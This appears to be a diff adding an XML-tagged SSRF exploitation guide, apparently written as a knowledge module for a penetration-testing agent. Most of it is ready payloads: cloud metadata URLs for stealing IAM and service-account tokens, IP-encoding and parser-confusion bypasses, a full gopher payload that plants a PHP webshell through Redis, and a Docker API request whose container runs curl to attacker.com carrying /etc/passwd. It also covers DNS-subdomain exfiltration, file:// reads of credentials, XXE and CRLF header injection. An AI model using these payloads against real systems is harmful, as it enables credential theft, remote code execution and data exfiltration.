@@ -1,0 +1,544 @@
+<ssrf_advanced_vulnerability_guide>
+<title>ADVANCED SERVER-SIDE REQUEST FORGERY (SSRF)</title>
+
+<critical>Advanced SSRF exploitation focuses on cloud metadata services, DNS rebinding, blind SSRF with out-of-band validation, protocol smuggling, and SSRF-to-RCE chains. Master cloud-native attack surfaces and modern bypass techniques.</critical>
+
+<scope>
+- Cloud metadata exploitation (AWS IMDSv1/v2, GCP, Azure, Oracle Cloud)
+- DNS rebinding attacks for bypassing localhost restrictions
+- Blind SSRF with out-of-band (OOB) techniques
+- Protocol smuggling (gopher, file, dict, ftp, jar, netdoc)
+- SSRF to RCE chains via Redis, FastCGI, Docker, Memcached
+- HTTP request smuggling combined with SSRF
+- SSRF via SVG, PDF rendering, and image processing
+</scope>
+
+<methodology>
+1. Map all input vectors that trigger server-side requests (URLs, webhooks, imports, previews, document processors)
+2. Establish OOB channels (DNS, HTTP callbacks) for blind SSRF validation
+3. Enumerate cloud provider detection and metadata endpoints
+4. Test protocol handlers and parser differentials
+5. Chain SSRF to achieve maximum impact (credentials, RCE, lateral movement)
+</methodology>
+
+<cloud_metadata_exploitation>
+<aws_imdsv1>
+{% raw %}
+# AWS IMDSv1 - No authentication required
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# Alternative encodings to bypass filters
+http://169.254.169.254/latest/meta-data/
+http://0xa9fea9fe/latest/meta-data/
+http://2852039166/latest/meta-data/
+http://0251.0376.0251.0376/latest/meta-data/
+http://[::ffff:a9fe:a9fe]/latest/meta-data/
+{% endraw %}
+</aws_imdsv1>
+
+<aws_imdsv2>
+{% raw %}
+# AWS IMDSv2 - Requires token via PUT request
+# Step 1: Get token (requires PUT method support)
+PUT /latest/api/token HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# Step 2: Use token in subsequent requests
+GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token: {token}
+
+# Bypass attempts:
+# - If PUT is blocked, look for redirects or intermediaries that preserve method
+# - Test if X-Forwarded-For or other headers disable IMDSv2 requirement
+# - Check if application provides header injection vector
+{% endraw %}
+</aws_imdsv2>
+
+<gcp_metadata>
+{% raw %}
+# GCP Metadata API
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+
+# Required header: Metadata-Flavor: Google
+# Bypass: Check if header injection is possible via URL or other vectors
+
+# Alternative endpoints
+http://metadata/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+{% endraw %}
+</gcp_metadata>
+
+<azure_metadata>
+{% raw %}
+# Azure Instance Metadata Service (IMDS)
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
+
+# Required header: Metadata: true
+# Bypass attempts similar to GCP
+{% endraw %}
+</azure_metadata>
+
+<oracle_cloud>
+{% raw %}
+# Oracle Cloud Infrastructure (OCI) Metadata
+http://169.254.169.254/opc/v1/instance/
+http://169.254.169.254/opc/v2/instance/metadata/
+http://169.254.169.254/opc/v1/identity/cert.pem
+http://169.254.169.254/opc/v1/identity/key.pem
+
+# Often no special headers required
+{% endraw %}
+</oracle_cloud>
+
+<ecs_container_credentials>
+{% raw %}
+# AWS ECS Task Metadata
+http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+http://169.254.170.2/v2/credentials/{guid}
+http://169.254.170.2/v2/metadata
+
+# Environment variable $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI often leaked in logs/errors
+{% endraw %}
+</ecs_container_credentials>
+</cloud_metadata_exploitation>
+
+<dns_rebinding_attacks>
+<concept>
+{% raw %}
+# DNS rebinding bypasses localhost/internal IP restrictions
+# 1. Initial DNS resolution returns attacker IP (passes whitelist check)
+# 2. Subsequent resolution returns internal IP (127.0.0.1, 169.254.169.254)
+# 3. If application caches DNS briefly, second request hits internal service
+
+# Tools: rebinder.app, 1u.ms, nip.io (for specific IPs)
+{% endraw %}
+</concept>
+
+<techniques>
+{% raw %}
+# Multiple A records technique
+# DNS returns both attacker IP and internal IP
+# Random selection may hit internal target
+
+# Time-based rebinding
+# Use very low TTL (0-1 seconds)
+# Change DNS response after first request
+
+# Services:
+http://7f000001.1u.ms/ → resolves to 127.0.0.1
+http://a9fea9fe.1u.ms/ → resolves to 169.254.169.254
+
+# Custom rebinding domains
+# Setup DNS server that changes responses based on query count
+# First query: return 1.2.3.4 (attacker controlled)
+# Second query: return 127.0.0.1 or 169.254.169.254
+{% endraw %}
+</techniques>
+
+<bypass_toctou>
+{% raw %}
+# Time-of-check to time-of-use (TOCTOU) race
+# 1. Application checks if domain is allowed (DNS resolves to safe IP)
+# 2. Application makes request (DNS now resolves to internal IP)
+# Window: Between DNS check and actual request
+
+# Maximize success:
+# - Use very low TTL
+# - Make multiple parallel requests
+# - Application may cache DNS for different duration than expected
+{% endraw %}
+</bypass_toctou>
+</dns_rebinding_attacks>
+
+<blind_ssrf_oob>
+<dns_exfiltration>
+{% raw %}
+# Use DNS queries to confirm SSRF and exfiltrate data
+http://attacker.burpcollaborator.net
+http://{unique-id}.attacker.com
+http://ssrf-test-{timestamp}.oob.example.com
+
+# DNS lookup will occur even if HTTP request fails
+# Check DNS logs for query to confirm SSRF
+
+# Data exfiltration via subdomain
+http://{base64-encoded-data}.attacker.com
+http://{hex-encoded-data}.oob.example.com
+{% endraw %}
+</dns_exfiltration>
+
+<http_callbacks>
+{% raw %}
+# HTTP/HTTPS callback to attacker server
+# Use unique IDs to correlate requests
+http://attacker.com/ssrf-test/{unique-id}
+https://webhook.site/{unique-id}
+http://requestbin.com/{unique-id}
+
+# Monitor for:
+# - HTTP request received
+# - Headers (User-Agent, X-Forwarded-For, etc.)
+# - IP address of requester
+# - Request method and body
+{% endraw %}
+</http_callbacks>
+
+<timing_based_detection>
+{% raw %}
+# Even without OOB channel, timing differences reveal SSRF
+# Internal services respond faster than external
+# Closed ports timeout vs open ports return quickly
+
+# Test internal service (fast response)
+url=http://127.0.0.1:6379/
+
+# Test external service (slow/timeout)
+url=http://non-existent-domain-12345.com/
+
+# Measure response time differences
+# Port scanning: test multiple ports, measure timing
+{% endraw %}
+</timing_based_detection>
+</blind_ssrf_oob>
+
+<protocol_smuggling>
+<gopher_protocol>
+{% raw %}
+# Gopher allows sending raw TCP payloads
+# Useful for Redis, SMTP, Memcached exploitation
+
+# Redis command execution
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
+
+# Redis write webshell (URL encoded)
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5Bcmd%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+
+# SMTP via Gopher
+gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0ARCPT%20TO%3A%3Cvictim%40target.com%3E%0ADATA%0AFrom%3A%20attacker%0ATo%3A%20victim%0ASubject%3A%20SSRF%0A%0ABody%0A.%0AQUIT
+
+# Memcached via Gopher
+gopher://127.0.0.1:11211/_set%20test%200%2060%204%0Atest%0A
+{% endraw %}
+</gopher_protocol>
+
+<file_protocol>
+{% raw %}
+# File protocol to read local files
+file:///etc/passwd
+file:///c:/windows/system32/drivers/etc/hosts
+file:///proc/self/environ
+file:///proc/self/cmdline
+
+# Bypass filters
+file://localhost/etc/passwd
+file://127.0.0.1/etc/passwd
+{% endraw %}
+</file_protocol>
+
+<dict_protocol>
+{% raw %}
+# Dict protocol for port scanning and service detection
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:11211/stats
+dict://127.0.0.1:3306/
+
+# Response differences reveal service type and version
+{% endraw %}
+</dict_protocol>
+
+<jar_protocol>
+{% raw %}
+# JAR protocol (Java)
+jar:http://attacker.com/evil.jar!/
+jar:file:///tmp/uploaded.jar!/
+
+# Can lead to XXE or SSRF in Java applications
+{% endraw %}
+</jar_protocol>
+
+<netdoc_protocol>
+{% raw %}
+# Netdoc protocol (Java)
+netdoc:///etc/passwd
+netdoc://127.0.0.1/etc/passwd
+
+# Java-specific, often less filtered
+{% endraw %}
+</netdoc_protocol>
+</protocol_smuggling>
+
+<ssrf_to_rce_chains>
+<redis_exploitation>
+{% raw %}
+# Via Gopher or dict protocol
+# 1. Clear database: FLUSHALL
+# 2. Set webshell: SET 1 "<?php system($_GET['cmd']); ?>"
+# 3. Configure dir: CONFIG SET dir /var/www/html
+# 4. Configure filename: CONFIG SET dbfilename shell.php
+# 5. Save: SAVE
+
+# Requires:
+# - Redis exposed internally
+# - Web directory writable by Redis user
+# - PHP enabled web server
+
+gopher://127.0.0.1:6379/_{gopher_payload}
+{% endraw %}
+</redis_exploitation>
+
+<fastcgi_exploitation>
+{% raw %}
+# FastCGI PHP-FPM exploitation
+# Send FastCGI binary protocol via Gopher
+
+# Requires:
+# - PHP-FPM listening on port (9000, 9001, etc.)
+# - Knowledge of PHP script path
+
+# Tools: Gopherus, custom scripts
+# Result: Execute arbitrary PHP code
+{% endraw %}
+</fastcgi_exploitation>
+
+<docker_api>
+{% raw %}
+# Docker daemon API (often on 2375, 2376)
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2375/images/json
+
+# Create and execute container:
+POST /containers/create HTTP/1.1
+Host: 127.0.0.1:2375
+Content-Type: application/json
+
+{
+  "Image": "alpine",
+  "Cmd": ["/bin/sh", "-c", "curl http://attacker.com/$(cat /host-root/etc/passwd)"],
+  "HostConfig": {"Binds": ["/:/host-root"]}
+}
+
+# Then start container:
+POST /containers/{id}/start HTTP/1.1
+{% endraw %}
+</docker_api>
+
+<kubernetes_api>
+{% raw %}
+# Kubernetes API server (often 443, 6443, 8080)
+https://kubernetes.default.svc/api/v1/namespaces/default/pods
+https://10.96.0.1/api/v1/namespaces/default/secrets
+
+# Requires service account token (may be available in environment)
+# Authorization: Bearer {token}
+
+# Read service account token
+file:///var/run/secrets/kubernetes.io/serviceaccount/token
+{% endraw %}
+</kubernetes_api>
+
+<memcached_exploitation>
+{% raw %}
+# Memcached on port 11211
+# Via Gopher or direct protocol
+
+# Set malicious cache value
+gopher://127.0.0.1:11211/_set%20test%200%2060%204%0Atest%0A
+
+# Can lead to:
+# - Cache poisoning
+# - Session hijacking (if sessions stored in memcached)
+# - Code execution if cached data is unserialized
+{% endraw %}
+</memcached_exploitation>
+</ssrf_to_rce_chains>
+
+<bypass_techniques>
+<ip_encoding>
+{% raw %}
+# Decimal
+http://2130706433/ → 127.0.0.1
+http://3232235777/ → 192.168.1.1
+
+# Hexadecimal
+http://0x7f000001/ → 127.0.0.1
+http://0x7f.0x0.0x0.0x1/ → 127.0.0.1
+
+# Octal
+http://0177.0.0.01/ → 127.0.0.1
+
+# Mixed
+http://127.1/ → 127.0.0.1
+http://127.0.1/ → 127.0.0.1
+
+# IPv6
+http://[::1]/ → 127.0.0.1
+http://[0:0:0:0:0:ffff:7f00:1]/ → 127.0.0.1
+
+# IPv4-mapped IPv6
+http://[::ffff:127.0.0.1]/
+http://[::ffff:7f00:1]/
+{% endraw %}
+</ip_encoding>
+
+<url_parser_confusion>
+{% raw %}
+# User info abuse
+http://attacker.com@169.254.169.254/
+http://169.254.169.254@attacker.com/
+http://attacker.com#@169.254.169.254/
+
+# Scheme confusion
+//169.254.169.254/
+http:///169.254.169.254/
+
+# Trailing dots
+http://169.254.169.254./
+http://127.0.0.1./
+
+# Backslash vs forward slash
+http://169.254.169.254\@attacker.com/
+http://169.254.169.254\.attacker.com/
+
+# URL encoding
+http://169.254.169.254/%2e%2e
+http://169.254.169.254/%00
+{% endraw %}
+</url_parser_confusion>
+
+<redirect_chaining>
+{% raw %}
+# Open redirect on trusted domain
+http://trusted.com/redirect?url=http://169.254.169.254/
+
+# If SSRF filter checks initial URL only
+# Redirect to internal target
+
+# Multi-hop redirects
+http://trusted1.com → http://trusted2.com → http://169.254.169.254/
+
+# Protocol switching via redirect
+http://trusted.com → file:///etc/passwd (if supported)
+{% endraw %}
+</redirect_chaining>
+
+<header_injection>
+{% raw %}
+# CRLF injection to set arbitrary headers
+url=http://169.254.169.254/%0d%0aMetadata-Flavor:%20Google%0d%0a
+
+# For IMDSv2 token
+url=http://169.254.169.254/%0d%0aX-aws-ec2-metadata-token:%20{token}%0d%0a
+
+# If application constructs HTTP request manually
+{% endraw %}
+</header_injection>
+</bypass_techniques>
+
+<special_contexts>
+<svg_ssrf>
+{% raw %}
+# SVG files can trigger SSRF via external entities
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
+</svg>
+
+# If SVG is rendered server-side (rsvg, ImageMagick, etc.)
+{% endraw %}
+</svg_ssrf>
+
+<pdf_ssrf>
+{% raw %}
+# PDF generation libraries may fetch external resources
+<img src="http://169.254.169.254/latest/meta-data/">
+<link rel="stylesheet" href="http://attacker.com/ssrf.css">
+
+# In HTML-to-PDF converters (wkhtmltopdf, Chrome headless, etc.)
+{% endraw %}
+</pdf_ssrf>
+
+<xml_external_entity>
+{% raw %}
+# XXE combined with SSRF
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+
+# Or file protocol
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+{% endraw %}
+</xml_external_entity>
+
+<webhook_ssrf>
+{% raw %}
+# Webhooks for integrations
+# Test if webhook endpoint can be internal
+
+# Slack webhook style
+https://hooks.slack.com/services/... → http://169.254.169.254/
+
+# Generic webhook
+POST /api/webhooks
+{"url": "http://169.254.169.254/latest/meta-data/"}
+{% endraw %}
+</webhook_ssrf>
+</special_contexts>
+
+<validation>
+1. Prove server-initiated request to internal/cloud resource (OOB callback or metadata access)
+2. Demonstrate credential/token extraction from cloud metadata
+3. Show impact escalation (RCE, lateral movement, data access)
+4. Provide reproducible payloads with exact bypass techniques used
+5. Document which protections were bypassed (URL filters, DNS checks, etc.)
+</validation>
+
+<false_positives>
+- Client-side only requests (JavaScript fetch, no server involvement)
+- Strict allowlists with DNS pinning and redirect blocking
+- Proper IMDSv2 enforcement with method restrictions
+- Network segmentation preventing metadata access
+- All protocols except HTTP/HTTPS blocked at application level
+</false_positives>
+
+<impact>
+- Cloud credentials exposure (AWS keys, GCP tokens, Azure MSI)
+- Access to internal services and admin panels
+- Remote code execution via protocol exploitation
+- Kubernetes/Docker API access enabling container escape
+- Lateral movement within cloud infrastructure
+- Data exfiltration from internal databases and services
+</impact>
+
+<pro_tips>
+1. Always start with OOB (DNS/HTTP) to confirm blind SSRF
+2. Test all protocol handlers available in the technology stack
+3. Cloud detection: try metadata endpoints immediately
+4. IMDSv2 bypass: look for PUT method support or header injection
+5. DNS rebinding works best with parallel requests
+6. Gopher protocol is extremely powerful for Redis/Memcached
+7. Combine SSRF with other vulns (XXE, SSTI, file upload)
+8. Check for SSRF in less obvious places (webhooks, import/export, analytics)
+9. Use timing differences for blind port scanning
+10. Document cloud credentials but don't use them without permission
+11. Chain quickly: metadata → credentials → API access (minimal impact demo)
+12. Test both IPv4 and IPv6 addresses
+13. URL parsers differ: what browser allows vs backend library
+14. Redirects are powerful bypass mechanisms
+15. Background jobs often have fewer SSRF protections
+</pro_tips>
+
+<remember>Advanced SSRF is about understanding the full attack surface: cloud providers, protocol handlers, bypass techniques, and chaining to achieve maximum impact. Every cloud deployment is vulnerable to metadata SSRF unless IMDSv2 is properly enforced. Blind SSRF with OOB callbacks is the standard validation method. Focus on demonstrating impact while minimizing actual damage.</remember>
+</ssrf_advanced_vulnerability_guide>
